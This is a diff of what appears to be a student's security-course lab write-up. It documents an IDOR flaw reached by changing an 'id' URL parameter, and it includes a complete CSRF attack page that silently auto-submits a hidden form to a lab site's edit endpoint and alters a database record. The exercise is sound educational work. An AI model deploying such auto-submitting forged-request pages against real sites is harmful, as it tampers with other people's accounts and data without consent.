@@ -77,20 +77,43 @@ Description:
 
 ## Red
 
-Vulnerability #1: __________________
+Vulnerability #1: Insecure Direct Object Reference
 
 Description:
 
 
+  * [x]  Below GIF show an attacker getting access to the hidden user's accounts that the attacker is not permitted to view. 
+  * [x]  This is done through modifying the "id" parameter in the URL's to change the GET request.
+  * [x]  Below are the accounts that the Attacker is able to access:
+![alt text](https://github.com/ethansam911/code_path_week_9/blob/main/red_attackers.gif)
 
-Vulnerability #2: __________________
 
-Description:
-
+Vulnerability #2: Cross-Site Request Forgery (CSRF)
 
 
+  * [x]  Created a malicious page that utilizes the user's session to forge a request to the database:
+```html
+<html>
+  <head>
+    <title>NOT A FAKE FORM</title>
+  </head>
+  <body onload="document.my_form.submit()">
+    <form action="https://35.184.199.7/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="GET REKT NOOB" />
+      <input type="text" name="last_name" value="LOVE YOU BABY" />
+      <input type="text" name="phone" value="777-777-7777" />
+      <input type="text" name="email" value="KEKW@KEKW.COM" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
+```
+  * [x]  This page secretly makes a post request on page load and hides the outcome in a hidden iframe. 
+  * [x]  As result, an account in the database is altered.
+
+![alt text](https://github.com/ethansam911/code_path_week_9/blob/main/red_xss.gif)
 
 ## Notes
 
-Describe any challenges encountered while doing the work
+Spent a lot of time trying to find the correct input boxes for the given exploitation methods. 
 
